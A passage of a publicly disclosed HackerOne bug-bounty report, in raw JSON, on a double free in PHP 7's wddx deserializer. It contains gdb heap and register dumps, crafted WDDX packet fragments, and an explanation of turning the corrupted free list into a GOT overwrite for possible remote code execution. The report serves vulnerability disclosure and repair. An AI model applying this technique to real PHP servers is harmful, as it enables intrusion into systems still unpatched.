itself.\u003c/p\u003e\n\n\u003cp\u003eAfter 1st efree(ent-\u0026gt;varname).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[-------------------------------------code-------------------------------------]\n   0x7c6f0b \u0026lt;php_wddx_process_data+606\u0026gt;:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 \u0026lt;php_wddx_process_data+613\u0026gt;:  mov    rdi,rax\n   0x7c6f15 \u0026lt;php_wddx_process_data+616\u0026gt;:  call   0x85637d \u0026lt;_efree\u0026gt;\n=\u0026gt; 0x7c6f1a \u0026lt;php_wddx_process_data+621\u0026gt;:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e \u0026lt;php_wddx_process_data+625\u0026gt;:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 \u0026lt;php_wddx_process_data+632\u0026gt;:\n    jmp    0x7c7005 \u0026lt;php_wddx_process_data+856\u0026gt;\n   0x7c6f2a \u0026lt;php_wddx_process_data+637\u0026gt;:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d \u0026lt;php_wddx_process_data+640\u0026gt;:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffab80 --\u0026gt; 0x7ffff4402a40 --\u0026gt; 0x121d150 --\u0026gt; 0x121cd41 --\u0026gt; 0x65756c6176 (\u0026#39;value\u0026#39;)\n0008| 0x7fffffffab88 --\u0026gt; 0x4f4402a60\n0016| 0x7fffffffab90 --\u0026gt; 0x12046b0 --\u0026gt; 0x74696873 (\u0026#39;shit\u0026#39;)\n0024| 0x7fffffffab98 --\u0026gt; 0x7fffffffb060 --\u0026gt; 0x1000000002\n0032| 0x7fffffffaba0 --\u0026gt; 0x7ffff4402a40 --\u0026gt; 0x121d150 --\u0026gt; 0x121cd41 --\u0026gt; 0x65756c6176 (\u0026#39;value\u0026#39;)\n0040| 0x7fffffffaba8 --\u0026gt; 0x7fffffffb060 --\u0026gt; 0x1000000002\n0048| 0x7fffffffabb0 --\u0026gt; 0xd91858 (\u0026quot;/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\u0026quot;)\n0056| 0x7fffffffabb8 --\u0026gt; 0x20 (\u0026#39; \u0026#39;)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(\u0026amp;ent-\u0026gt;data);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff4471090\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAfter the second efree(ent-\u0026gt;varname)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[-------------------------------------code-------------------------------------]\n   0x7c6f0b \u0026lt;php_wddx_process_data+606\u0026gt;:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 \u0026lt;php_wddx_process_data+613\u0026gt;:  mov    rdi,rax\n   0x7c6f15 \u0026lt;php_wddx_process_data+616\u0026gt;:  call   0x85637d \u0026lt;_efree\u0026gt;\n=\u0026gt; 0x7c6f1a \u0026lt;php_wddx_process_data+621\u0026gt;:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e \u0026lt;php_wddx_process_data+625\u0026gt;:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 \u0026lt;php_wddx_process_data+632\u0026gt;:\n    jmp    0x7c7005 \u0026lt;php_wddx_process_data+856\u0026gt;\n   0x7c6f2a \u0026lt;php_wddx_process_data+637\u0026gt;:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d \u0026lt;php_wddx_process_data+640\u0026gt;:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffad00 --\u0026gt; 0x7\n0008| 0x7fffffffad08 --\u0026gt; 0x400000005\n0016| 0x7fffffffad10 --\u0026gt; 0x1219809 (\u0026quot;\\n\\t\\t\\t\u0026lt;/boolean\u0026gt;\\n\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\u0026lt;var name=\\\u0026quot;YYYYYYYY\\\u0026quot;\u0026gt;\\n\\t\\t\\t\u0026lt;var name=\\\u0026quot;ZZZZZZZZ\\\u0026quot;\u0026gt;\\n\\t\\t\\t\\t\u0026lt;var name=\\\u0026quot;EZEZEZEZ\\\u0026quot;\u0026gt;\\n\\t\\t\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\u0026lt;/var\u0026gt;\\n\\t\u0026lt;/array\u0026gt;\\n\u0026lt;/wddxPacket\u0026gt;\u0026quot;)\n0024| 0x7fffffffad18 --\u0026gt; 0x7fffffffb060 --\u0026gt; 0x1000000002\n0032| 0x7fffffffad20 --\u0026gt; 0x7ffff4402a40 --\u0026gt; 0x121d150 --\u0026gt; 0x121cd41 --\u0026gt; 0x65756c6176 (\u0026#39;value\u0026#39;)\n0040| 0x7fffffffad28 --\u0026gt; 0x7fffffffb060 --\u0026gt; 0x1000000002\n0048| 0x7fffffffad30 --\u0026gt; 0x121d168 --\u0026gt; 0x0\n0056| 0x7fffffffad38 --\u0026gt; 0x121cd41 --\u0026gt; 0x65756c6176 (\u0026#39;value\u0026#39;)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(\u0026amp;ent-\u0026gt;data);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff44710c0\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewe got a chunk that point to itself, because zend_mm_alloc_small() will update heap-\u0026gt;free_slot[bin_num] = p-\u0026gt;next_free_slot.\u003c/p\u003e\n\n\u003cp\u003eIf we try to malloc with the same size of ent-\u0026gt;varname (was freed) at 0x7ffff44710c0 :\u003c/p\u003e\n\n\u003cp\u003e1st malloc : YYYYYYYY , zend_mm_alloc_small() will return with 0x7ffff44710c0 and update heap-\u0026gt;free_slot[bin_num] = p-\u0026gt;next_free_slot = 0x7ffff44710c0 (because 0x7ffff44710c0 point to itself as above).\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff44710c0 (\u0026quot;YYYYYYYY\u0026quot;)\nRBX: 0x5\nRCX: 0x12\nRDX: 0x9 (\u0026#39;\\t\u0026#39;)\nRSI: 0x12046b0 (\u0026quot;YYYYYYYY\u0026quot;)\nRDI: 0x7ffff44710c0 (\u0026quot;YYYYYYYY\u0026quot;)\nRBP: 0x7fffffffad20 --\u0026gt; 0x7fffffffada0 --\u0026gt; 0x121b780 --\u0026gt; 0x1217fe0 --\u0026gt; 0x0\nRSP: 0x7fffffffac10 --\u0026gt; 0x7ffff4402a40 --\u0026gt; 0x7ffff44029c0 --\u0026gt; 0x7ffff4402980 --\u0026gt; 0x7ffff4402940 --\u0026gt; 0x7ffff44028c0 --\u0026gt; 0x7ffff4402bc0 --\u0026gt; 0x7ffff4402c00 --\u0026gt; 0x7ffff4402c40 --\u0026gt; 0x7ffff4402c80 --\u0026gt; 0x7ffff4402cc0 --\u0026gt; 0x7ffff4402d00 --\u0026gt; 0x7ffff4402d40 --\u0026gt; 0x7ffff4402d80 --\u0026gt; 0x7ffff4402dc0 --\u0026gt; 0x7ffff4402e00 --\u0026gt; 0x7ffff4402e40 --\u0026gt; 0x7ffff4402e80 --\u0026gt; 0x7ffff4402ec0 --\u0026gt; 0x7ffff4402f00 --\u0026gt; 0x7ffff4402f40 --\u0026gt; 0x7ffff4402f80 --\u0026gt; 0x7ffff4402fc0 --\u0026gt; 0x0\nRIP: 0x7c5ce1 (\u0026lt;php_wddx_push_element+2802\u0026gt;:  mov    rdx,rax)\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --\u0026gt; 0x6f6f6200656d616e (\u0026#39;name\u0026#39;)\nR13: 0x1219828 (\u0026quot;name=\\\u0026quot;YYYYYYYY\\\u0026quot;\u0026gt;\\n\\t\\t\\t\u0026lt;var name=\\\u0026quot;ZZZZZZZZ\\\u0026quot;\u0026gt;\\n\\t\\t\\t\\t\u0026lt;var name=\\\u0026quot;EZEZEZEZ\\\u0026quot;\u0026gt;\\n\\t\\t\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\\t\u0026lt;/var\u0026gt;\\n\\t\\t\u0026lt;/var\u0026gt;\\n\\t\u0026lt;/array\u0026gt;\\n\u0026lt;/wddxPacket\u0026gt;\u0026quot;)\nR14: 0x1\nR15: 0x121d150 --\u0026gt; 0x121cd34 --\u0026gt; 0x6f6f6200656d616e (\u0026#39;name\u0026#39;)\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7c5cd2 \u0026lt;php_wddx_push_element+2787\u0026gt;:\n    lea    rsi,[rip+0x5cbb7f]        # 0xd91858\n   0x7c5cd9 \u0026lt;php_wddx_push_element+2794\u0026gt;: mov    rdi,rax\n   0x7c5cdc \u0026lt;php_wddx_push_element+2797\u0026gt;: call   0x856850 \u0026lt;_estrdup\u0026gt;\n=\u0026gt; 0x7c5ce1 \u0026lt;php_wddx_push_element+2802\u0026gt;: mov    rdx,rax\n   0x7c5ce4 \u0026lt;php_wddx_push_element+2805\u0026gt;: mov    rax,QWORD PTR [rbp-0xc0]\n   0x7c5ceb \u0026lt;php_wddx_push_element+2812\u0026gt;: mov    QWORD PTR [rax+0x8],rdx\n   0x7c5cef \u0026lt;php_wddx_push_element+2816\u0026gt;:\n    jmp    0x7c639c \u0026lt;php_wddx_push_element+4525\u0026gt;\n   0x7c5cf4 \u0026lt;php_wddx_push_element+2821\u0026gt;: add    DWORD PTR [rbp-0xd8],0x1\n[------------------------------------stack-------------------------------------]\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e2nd malloc : ZZZZZZZZ , zend_mm_alloc_small() will return with 0x7ffff44710c0 again and then update \u003cbr\u003e\nheap-\u0026gt;free_slot[bin_num] = p-\u0026gt;next_free_slot = YYYYYYYY (because zend_mm_alloc_small think YYYYYYYY is the next_free_slot).\u003c/p\u003e\n\n\u003cp\u003e3rd malloc:  EZEZEZEZ, zend_mm_alloc_small() will return YYYYYYYY for us and this lead to crash at \u003cstrong\u003eheap-\u0026gt;free_slot[bin_num] = p-\u0026gt;next_free_slot;\u003c/strong\u003e when zend_mm_alloc_small() try to update next_free_slot to heap-\u0026gt;free_slot.\u003c/p\u003e\n\n\u003cp\u003eAt this point, if we replace YYYYYYYY with an address of GOT table for example memcpy@got, zend_mm_alloc_small() will happly return this address for us, and the call memcpy(memcpy@got,EZEZEZEZE,8); in which EZEZEZEZ is value we control, this may lead to remote code execution.\u003c/p\u003e\n\n\u003cp\u003eThis bug also works in PHP 7.0.x\u003c/p\u003e\n\n\u003cp\u003eReferences: \u003ca title=\"https://bugs.php.net/bug.php?id=72340\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D72340\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=72340\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":70,"name":"Code Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:34:59.491Z","allow_singular_disclosure_after":-35664956.22411874,"singular_disclosure_allowed":true,"vote_count":1,"voters":["dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1038985,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-26T22:31:05.039Z","updated_at":"2016-06-26T22:31:05.039Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"hoangnguyen","url":"/hoangnguyen"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1038987,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-26T22:31:12.109Z","updated_at":"2016-06-26T22:31:12.109Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"hoangnguyen","url":"/hoangnguyen"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6026360,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:34:59.424Z","updated_at":"2019-10-13T09:34:59.424Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285837,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:35:00.276Z","updated_at":"2019-11-12T09:35:00.276Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}